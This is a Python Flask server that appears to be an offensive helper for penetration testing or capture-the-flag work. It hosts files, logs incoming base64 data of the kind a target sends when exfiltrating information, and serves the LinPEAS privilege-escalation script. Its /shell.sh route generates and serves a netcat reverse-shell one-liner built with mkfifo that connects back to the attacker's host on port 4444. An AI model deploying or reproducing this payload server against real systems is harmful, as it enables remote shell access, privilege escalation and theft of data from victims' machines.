import os, argparse, base64, logging
from flask import Flask, abort, json, send_file, request
from formater import Formatter

LINPEAS_PATH = None
SHELL_PATH   = "shell.sh" 

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

consoleHandler = logging.StreamHandler()
consoleHandler.setLevel(logging.DEBUG)
consoleHandler.setFormatter(Formatter())

logger.addHandler(consoleHandler)

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--address', type=str, help='IP to listen on')
parser.add_argument('-p', '--port', type=int, help='Port to listen on')
parser.add_argument('-d', '--dir', type=str, help='Directory to host on root path')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging')

args = parser.parse_args()

if args.address == None:
    args.address = '0.0.0.0'

if args.port == None:
    args.port = 80

if args.dir == None:
    args.dir = os.getcwd()

if args.verbose == None:
    args.verbose = False

api = Flask(__name__)

@api.route('/', defaults={'req_path': ''})
@api.route('/<path:req_path>')
def dir_listing(req_path):
    # Joining the base and the requested path
    abs_path = os.path.join(args.dir, req_path)

    logHeaders(args.verbose, request)

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        logger.error("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "404 Not Found"))
        return abort(404)

    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
        return send_file(abs_path)
    
    return json.jsonify({"status": "online"}), 200, {}

@api.route('/base64/<encoded>')
def decode_base64(encoded):
    logHeaders(args.verbose, request)
    logger.info("{0} {1} - /base64/{2} ".format(request.remote_addr, str(request.method), encoded))
    try:
        logger.debug("Decoded data: {0}".format(base64.b64decode(encoded).decode('utf-8')))
    except Exception:
        logger.error('Failed to parse Base64')

    return json.dumps({}), 200, {}

@api.route('/linpeas.sh')
def linpeas():
    if not os.path.exists(LINPEAS_PATH):
        logger.critical("Linpeas not found")
        return abort(404)
    return send_file(LINPEAS_PATH)

@api.route('/shell.sh')
def shell():
    shellFile = open(SHELL_PATH, "w")
    shellFile.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.address + " 4444 >/tmp/f")
    shellFile.close()
    return send_file(SHELL_PATH)

def logHeaders(verbose, request):
    if verbose:
        for h in request.headers:
            logger.debug("{0}: {1}".format(h[0], h[1]))

if __name__ == '__main__':
    from waitress import serve
    serve(api, host=args.address, port=str(args.port))